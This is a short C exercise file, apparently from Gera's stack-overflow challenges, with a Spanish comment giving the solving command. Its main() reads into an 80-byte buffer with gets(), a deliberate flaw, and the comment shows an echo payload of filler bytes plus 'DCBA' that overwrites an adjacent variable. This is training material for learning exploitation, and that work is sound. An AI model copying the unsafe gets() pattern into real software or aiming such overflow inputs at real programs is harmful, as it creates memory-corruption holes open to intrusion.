/*
* stack1-stdin.c
*
* specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {

	char buf[80];
	int cookie=1;
	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);
	printf ("cookie: %08x\n", cookie);
	if (cookie == 0x41424344)
		printf("you win!\n");
}

/*
*compilar el programa, y luego ejecutar el siguiente comando:
* echo -e "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEFFFFFFFFFFGGGGGGGGGGHHHHHHHHHHDCBA"|./stack1
*/ 
